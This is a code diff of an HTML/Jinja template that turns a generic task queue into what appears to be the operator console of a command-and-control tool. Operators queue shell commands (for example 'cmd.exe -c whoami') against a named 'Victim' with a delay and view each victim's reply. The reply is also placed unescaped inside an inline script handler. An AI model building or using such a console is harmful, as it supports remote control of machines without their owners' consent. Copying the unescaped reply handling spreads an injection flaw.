@@ -12,6 +12,19 @@
 {% endblock %}
 
 {% block body %}
+    <style>
+        /* Chrome, Safari, Edge, Opera */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+        }
+
+        /* Firefox */
+        input[type=number] {
+        -moz-appearance: textfield;
+        }
+    </style>
     <div class="container">
         <div class="row" style="height: 100vh; overflow: hidden;">
             <div class="col-12">
@@ -20,9 +33,9 @@
                         <thead>
                             <tr>
                                 <th scope="col">#</th>
-                                <th scope="col">File</th>
-                                <th scope="col">Args</th>
-                                <th scope="col">Verbose</th>
+                                <th scope="col">Command</th>
+                                <th scope="col">Victim</th>
+                                <th scope="col">Operator</th>
                                 <th scope="col">Status</th>
                                 <th scope="col">Actions</th>
                             </tr>
@@ -31,12 +44,12 @@
                             {% for task in tasks %}
                                 <tr>
                                     <td>{{ task["id"] }}</td>
-                                    <td>{{ task["file"] }}</td>
-                                    <td>{% for arg in task['args'] %}{{ arg }} {% endfor %}</td>
-                                    <td>{% if task["verbose"] %}<span style="color: lime; font-weight: 600;">YES</span>{% else %}<span style="color: red; font-weight: 600;">NO</span>{% endif %}</td>
-                                    <td>{% if task["fired"] %}<span style="color: lime; font-weight: 600;">Finished</span>{% else %}<span style="color: lightblue; font-weight: 600;">Queued</span>{% endif %}</td>
+                                    <td>{{ task["command"]}}</td>
+                                    <td>{{ task["victim"] }}</td>
+                                    <td>{{ task["operator"] }}</td>
+                                    <td>{% if task["fired"] %}<span style="color: lime; font-weight: 600;">Finished</span>{% else %}<span style="color: rgb(34, 172, 218); font-weight: 600;">Queued</span>{% endif %}</td>
                                     <td>
-                                        <button class="btn btn-secondary"><i class="bi bi-card-heading"></i></button>
+                                        <button class="btn btn-secondary" onclick="modal_text('Reply {{ task['id'] }}', '<p>{{ task['reply'] }}</p>')"><i class="bi bi-card-heading"></i></button>
                                         <button class="btn btn-danger" onclick="confirm_delete(delete_task, id='{{ task['id'] }}')"><i class="bi bi-trash fs-6"></i></button>
                                     </td>
                                 </tr>
@@ -46,28 +59,29 @@
                 </div>
             </div>
             <div class="col-12 fixed-bottom bg-dark" style="border-top: 2px solid; border-color: #ff8800">
-                <form class="row align-items-center" style="width: 100%;">
+                <form method="post" class="row align-items-center" style="width: 100%; margin-bottom: 15px">
                     <div class="col-md-3">
-                        <label for="file" class="form-label text-light">File:</label>
-                        <input type="text" placeholder="cmd.exe" name="file" id="file" class="form-control dark-input" required>
+                        <label for="command" class="form-label text-light">Cmd:</label>
+                        <input type="text" placeholder="cmd.exe" name="command" id="command" class="form-control dark-input" required>
                     </div>
-                    <div class="col-md-4">
+                    <div class="col-md-3">
                         <label for="args" class="form-label text-light">Args:</label>
-                        <input type="text" placeholder="-c echo Hello World" name="args" id="args" class="form-control dark-input" required>
+                        <input type="text" placeholder="-c whoami" name="args" id="args" class="form-control dark-input" required>
                     </div>
                     <div class="col-md-3">
-                        <label for="verbose" class="form-label text-light">Verbose:</label>
-                        <select class="form-select dark-input" name="verbose" id="verbose">
-                            <option value="true" selected>true</option>
-                            <option value="false">false</option>
-                        </select>
+                        <label for="victim" class="form-label text-light">Victim:</label>
+                        <input type="text" class="form-select dark-input" name="victim" id="victim" required>
+                    </div>
+                    <div class="col-md-1">
+                        <label for="victim" class="form-label text-light">Delay:</label>
+                        <input type="number" class="form-select dark-input" value="0" name="delay" id="delay" required>
                     </div>
                     <div class="col-md-2">
-                        <button class="btn btn-primary" style="margin: 10px;">Queue Task</button>
-                        <button class="btn btn-danger" style="margin: 10px;">Delete All</button>
+                        <button class="btn btn-primary" style="margin-top: 25px;">Queue Task</button>
                     </div>
                 </form>
             </div>
         </div>
     </div>
+    <script>{% include 'js/console.js' %}</script>
 {% endblock %}
